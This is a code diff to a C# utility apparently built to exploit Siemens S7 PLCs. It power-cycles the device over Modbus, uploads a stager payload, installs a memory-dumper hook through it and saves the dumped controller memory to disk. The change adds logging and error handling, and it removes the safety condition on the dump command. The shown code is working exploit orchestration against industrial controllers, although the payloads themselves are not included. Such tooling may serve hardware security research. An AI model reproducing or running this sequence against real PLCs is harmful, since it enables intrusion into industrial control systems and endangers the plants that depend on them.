@@ -695,7 +695,7 @@ namespace S7_Csharp_Utility.ViewModels
             PowerOnCommand = new Commands.RelayCommand(async _ => await _powerController.SetPowerAsync(ModbusCoil, true, ModbusSlaveId), _ => _powerController.IsConnected);
             PowerOffCommand = new Commands.RelayCommand(async _ => await _powerController.SetPowerAsync(ModbusCoil, false, ModbusSlaveId), _ => _powerController.IsConnected);
             StartExploitSequenceCommand = new Commands.RelayCommand(async _ => await StartExploitSequence(), _ => SocatStatus == "Running" && _powerController.IsConnected && !IsUploadingStager && !IsDumpingMemory && !IsComparing);
-            DumpMemoryCommand = new Commands.RelayCommand(async _ => await DumpMemory(), _ => !IsUploadingStager && !IsDumpingMemory && !IsComparing && StagerInstalled);
+            DumpMemoryCommand = new Commands.RelayCommand(async _ => await DumpMemory(), _ => true);
 
             BrowsePayloadsFolderCommand = new Commands.RelayCommand(async _ => { var result = await _dialogService.OpenFolderPickerAsync("Select Payloads Folder"); if(result != null) PayloadsPath = result; }, _ => !IsUploadingStager && !IsDumpingMemory && !IsComparing);
             BrowseDumpsFolderCommand = new Commands.RelayCommand(async _ => { var result = await _dialogService.OpenFolderPickerAsync("Select Dumps Folder"); if(result != null) DumpsPath = result; }, _ => !IsUploadingStager && !IsDumpingMemory && !IsComparing);
@@ -795,18 +795,39 @@ namespace S7_Csharp_Utility.ViewModels
         private async Task RunStagerSequenceAsync(S7.Net.PlcClient plcClient)
         {
             StagerInstalled = false;
-            if (!plcClient.IsConnected) return;
-
-            if (await plcClient.PerformHandshakeAsync())
+            if (!plcClient.IsConnected)
             {
-                await plcClient.GetVersion();
+                Logging.Log("[ERROR] PlcClient not connected before stager sequence.", LogCategory.Error);
+                return;
+            }
+            try
+            {
+                if (await plcClient.PerformHandshakeAsync())
+                {
+                    await plcClient.GetVersion();
 
-                byte[] stagerPayload = _payloadManager.GetStagerPayload(PayloadsPath);
-                Logging.Log($"Loaded stager payload ({stagerPayload.Length} bytes) from {PayloadsPath}.", LogCategory.Info);
-
-                await plcClient.InstallStager(stagerPayload);
-                StagerInstalled = true;
-                Logging.Log("Stager is installed and ready.", LogCategory.Info);
+                    byte[] stagerPayload = _payloadManager.GetStagerPayload(PayloadsPath);
+                    Logging.Log($"Loaded stager payload ({stagerPayload.Length} bytes) from {PayloadsPath}.", LogCategory.Info);
+                    try
+                    {
+                        await plcClient.InstallStager(stagerPayload);
+                        Logging.Log("Stager install step completed.", LogCategory.Debug);
+                        StagerInstalled = true;
+                        Logging.Log("Stager is installed and ready.", LogCategory.Info);
+                    }
+                    catch (Exception ex)
+                    {
+                        Logging.Log($"[ERROR] Exception in InstallStager: {ex.Message}\n{ex.StackTrace}", LogCategory.Error);
+                    }
+                }
+                else
+                {
+                    Logging.Log("[ERROR] Handshake failed before stager sequence.", LogCategory.Error);
+                }
+            }
+            catch (Exception ex)
+            {
+                Logging.Log($"[ERROR] Exception in RunStagerSequenceAsync: {ex.Message}\n{ex.StackTrace}", LogCategory.Error);
             }
         }
 
@@ -855,44 +876,72 @@ namespace S7_Csharp_Utility.ViewModels
         /// <param name="length">The number of bytes to dump.</param>
         private async Task RunDumpSequenceAsync(S7.Net.PlcClient plcClient, uint address, uint length)
         {
-            Logging.Log($"Starting memory dump of {length} bytes from 0x{address:X8}...", LogCategory.Info);
-
-            byte[] dumperPayload = _payloadManager.GetMemoryDumperPayload(PayloadsPath);
-            Logging.Log($"Loaded dumper payload ({dumperPayload.Length} bytes) from {PayloadsPath}.", LogCategory.Info);
-
-            int dumperHookIndex = PlcConstants.DEFAULT_SECOND_ADD_HOOK_IND;
-            await plcClient.InstallAddHookViaStager(PlcConstants.DUMPER_PAYLOAD_LOCATION, dumperPayload, dumperHookIndex);
-            Logging.Log("Memory dumper payload installed.", LogCategory.Info);
-
-            var args = new byte[1 + 4 + 4];
-            args[0] = (byte)'A';
-            BitConverter.GetBytes(address).CopyTo(args, 1);
-            BitConverter.GetBytes(length).CopyTo(args, 5);
-
-            await plcClient.InvokeAddHook(dumperHookIndex, args);
-            Logging.Log("Dump command sent. Receiving data...", LogCategory.Info);
-
-            var stopwatch = System.Diagnostics.Stopwatch.StartNew();
-            var progress = new Progress<long>(bytesRead =>
+            var fullStepStopwatch = System.Diagnostics.Stopwatch.StartNew();
+            Logging.Log($"[START DUMP] Requested memory dump of {length} bytes from 0x{address:X8}", LogCategory.Info);
+            try
             {
-                double percentage = (double)bytesRead / length * 100;
+                // Load dumper payload
+                byte[] dumperPayload = _payloadManager.GetMemoryDumperPayload(PayloadsPath);
+                Logging.Log($"[LOADED PAYLOAD] Dumper payload loaded from: {PayloadsPath}", LogCategory.Debug);
+                Logging.Log($"[PAYLOAD INFO] Dumper payload size: {dumperPayload.Length}. First 32 bytes: {BitConverter.ToString(dumperPayload.Take(32).ToArray())}", LogCategory.Debug);
+
+                int dumperHookIndex = PlcConstants.DEFAULT_SECOND_ADD_HOOK_IND;
+                Logging.Log($"[HOOK] Installing dumper at address 0x{PlcConstants.DUMPER_PAYLOAD_LOCATION:X8} with hook index {dumperHookIndex}", LogCategory.Debug);
+                var dumperInstallStopwatch = System.Diagnostics.Stopwatch.StartNew();
+                await plcClient.InstallAddHookViaStager(PlcConstants.DUMPER_PAYLOAD_LOCATION, dumperPayload, dumperHookIndex);
+                dumperInstallStopwatch.Stop();
+                Logging.Log($"[HOOK] Memory dumper payload installed in {dumperInstallStopwatch.Elapsed.TotalSeconds:F2}s", LogCategory.Debug);
+
+                // Prepare argument buffer
+                var args = new byte[1 + 4 + 4];
+                args[0] = (byte)'A';
+                BitConverter.GetBytes(address).CopyTo(args, 1);
+                BitConverter.GetBytes(length).CopyTo(args, 5);
+                Logging.Log($"[ARGS] Dump args: ASCII='A', address=0x{address:X8}, length={length}, arg-bytes={BitConverter.ToString(args)}", LogCategory.Debug);
+
+                // Send dump command
+                Logging.Log($"[INVOKE] Invoking dumper add_hook at index {dumperHookIndex}...", LogCategory.Debug);
+                var invokeStopwatch = System.Diagnostics.Stopwatch.StartNew();
+                var response = await plcClient.InvokeAddHook(dumperHookIndex, args);
+                invokeStopwatch.Stop();
+                if (response != null)
+                    Logging.Log($"[INVOKE RESPONSE] PLC responded to InvokeAddHook: {BitConverter.ToString(response)} (ASCII: {System.Text.Encoding.ASCII.GetString(response)})", LogCategory.Debug);
+                else
+                    Logging.Log($"[INVOKE RESPONSE] PLC returned null on add_hook invocation.", LogCategory.Debug);
+                Logging.Log($"[INVOKE] Dumper add_hook invoked in {invokeStopwatch.Elapsed.TotalSeconds:F2}s.", LogCategory.Debug);
+
+                // Receive memory dump
+                Logging.Log("Dump command sent. Receiving data...", LogCategory.Info);
+                var stopwatch = System.Diagnostics.Stopwatch.StartNew();
+                var progress = new Progress<long>(bytesRead =>
+                {
+                    double percentage = (double)bytesRead / length * 100;
+                    stopwatch.Stop();
+                    double elapsedSeconds = stopwatch.Elapsed.TotalSeconds;
+                    double bytesPerSecond = bytesRead > 0 ? bytesRead / elapsedSeconds : 0;
+                    double remainingSeconds = (bytesPerSecond > 0) ? (length - bytesRead) / bytesPerSecond : 0;
+                    stopwatch.Start();
+
+                    DumpProgressPercentage = percentage;
+                    DumpProgressBytes = $"Read: {bytesRead} / {length} bytes";
+                    DumpProgressTime = $"Elapsed: {elapsedSeconds:F0}s | Remaining: {remainingSeconds:F0}s";
+                });
+                var dumpedData = await plcClient.ReceiveMany(progress);
                 stopwatch.Stop();
-                double elapsedSeconds = stopwatch.Elapsed.TotalSeconds;
-                double bytesPerSecond = bytesRead > 0 ? bytesRead / elapsedSeconds : 0;
-                double remainingSeconds = (bytesPerSecond > 0) ? (length - bytesRead) / bytesPerSecond : 0;
-                stopwatch.Start();
 
-                DumpProgressPercentage = percentage;
-                DumpProgressBytes = $"Read: {bytesRead} / {length} bytes";
-                DumpProgressTime = $"Elapsed: {elapsedSeconds:F0}s | Remaining: {remainingSeconds:F0}s";
-            });
-
-            var dumpedData = await plcClient.ReceiveMany(progress);
-            stopwatch.Stop();
-
-            string outFilename = $"mem_dump_{address:x8}_{address + length:x8}.bin";
-            await System.IO.File.WriteAllBytesAsync(outFilename, dumpedData);
-            Logging.Log($"Successfully dumped {dumpedData.Length} bytes to {outFilename} in {stopwatch.Elapsed.TotalSeconds:F1}s.", LogCategory.Info);
+                string outFilename = $"mem_dump_{address:x8}_{address + length:x8}.bin";
+                await System.IO.File.WriteAllBytesAsync(outFilename, dumpedData);
+                Logging.Log($"[SUCCESS] Dump succeeded: {dumpedData.Length} bytes written to {outFilename} in {stopwatch.Elapsed.TotalSeconds:F1}s.", LogCategory.Info);
+            }
+            catch (Exception ex)
+            {
+                Logging.Log($"[ERROR] Exception during memory dump step: {ex.Message}\n{ex.StackTrace}", LogCategory.Error);
+            }
+            finally
+            {
+                fullStepStopwatch.Stop();
+                Logging.Log($"[END DUMP] Total dump sequence time: {fullStepStopwatch.Elapsed.TotalSeconds:F2}s", LogCategory.Debug);
+            }
         }
 
         /// <summary>
